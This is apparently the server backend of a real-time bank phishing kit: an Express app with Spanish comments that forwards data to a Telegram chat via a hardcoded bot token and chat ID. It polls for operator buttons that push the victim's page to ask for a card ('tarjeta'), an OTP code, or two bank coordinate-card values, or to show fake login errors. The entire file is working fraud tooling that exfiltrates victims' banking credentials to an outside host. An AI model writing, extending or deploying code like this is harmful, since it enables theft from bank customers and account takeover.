const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
app.use(express.json());

const TOKEN = process.env.TELEGRAM_TOKEN || "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";
const CHAT_ID = process.env.CHAT_ID || "-1003027102929";

// ── ESTADO PERSISTENTE ──
let lastUpdateId = -1; // -1 = traer todos los updates disponibles
let waitingForCoords = false;
let pendingCoords = null;

// ── SEND ──
app.post('/api/send', async (req, res) => {
  try {
    const { text, buttons } = req.body;
    const payload = { chat_id: CHAT_ID, text, parse_mode: "HTML" };
    if (buttons && buttons.length) payload.reply_markup = { inline_keyboard: buttons };

    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const data = await r.json();
    res.json({ ok: true, data });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// ── POLL ──
app.get('/api/poll', async (req, res) => {
  try {
    // Si hay coords pendientes, mandarlas y limpiar
    if (pendingCoords) {
      const coords = pendingCoords;
      pendingCoords = null;
      waitingForCoords = false;
      return res.json({ ok: true, action: 'bancontrol', coords, update_id: lastUpdateId });
    }

    // Si lastUpdateId es -1, traer últimos updates sin offset
    const offsetParam = lastUpdateId >= 0 ? `&offset=${lastUpdateId + 1}` : '';
    const r = await fetch(
      `https://api.telegram.org/bot${TOKEN}/getUpdates?timeout=3${offsetParam}&allowed_updates=["callback_query","message"]`
    );
    const data = await r.json();

    console.log('Updates recibidos:', data.result?.length || 0, '| waitingForCoords:', waitingForCoords);
    if (!data.ok || !data.result.length) {
      return res.json({ ok: true, action: null, waitCoords: waitingForCoords, update_id: lastUpdateId });
    }

    for (const update of data.result) {
      lastUpdateId = update.update_id;

      // MENSAJE DE TEXTO — siempre tratar como coords si tiene 2 palabras
      if (update.message?.text) {
        const txt = update.message.text.trim();
        if (txt.startsWith('/')) continue;

        console.log('Mensaje recibido:', txt, '| waitingForCoords:', waitingForCoords);

        const parts = txt.toUpperCase().split(/\s+/);
        if (parts.length >= 2) {
          waitingForCoords = false;
          return res.json({
            ok: true,
            action: 'bancontrol',
            coords: [parts[0], parts[1]],
            update_id: lastUpdateId
          });
        }
        continue;
      }

      // CALLBACK QUERY — botones
      const cb = update.callback_query;
      if (!cb) continue;
      const cbData = cb.data;

      await fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ callback_query_id: cb.id, text: "✅ Enviado al cliente" }),
      });

      if (cbData === "bancontrol") {
        waitingForCoords = true;
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: cb.message.chat.id,
            text: `🏦 *BANCONTROL*\n\nEscribe las 2 coordenadas separadas por espacio:\n\nEjemplo: \`D1 D2\``,
            parse_mode: "Markdown",
          }),
        });
        return res.json({ ok: true, action: null, waitCoords: true, update_id: lastUpdateId });
      }

      if (cbData === "otp")              return res.json({ ok: true, action: "otp",              update_id: lastUpdateId });
      if (cbData === "tarjeta")          return res.json({ ok: true, action: "tarjeta",          update_id: lastUpdateId });
      if (cbData === "error_login")      return res.json({ ok: true, action: "error_login",      update_id: lastUpdateId });
      if (cbData === "error_otp")        return res.json({ ok: true, action: "error_otp",        update_id: lastUpdateId });
      if (cbData === "error_tarjeta")    return res.json({ ok: true, action: "error_tarjeta",    update_id: lastUpdateId });
      if (cbData === "error_bancontrol") return res.json({ ok: true, action: "error_bancontrol", update_id: lastUpdateId });
      if (cbData === "finalizar")        return res.json({ ok: true, action: "finalizar",        update_id: lastUpdateId });
    }

    return res.json({ ok: true, action: null, waitCoords: waitingForCoords, update_id: lastUpdateId });

  } catch (err) {
    res.status(500).json({ ok: false, action: null, error: err.message });
  }
});

// Archivos estáticos AL FINAL para no interferir con las rutas API
app.use(express.static(__dirname));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
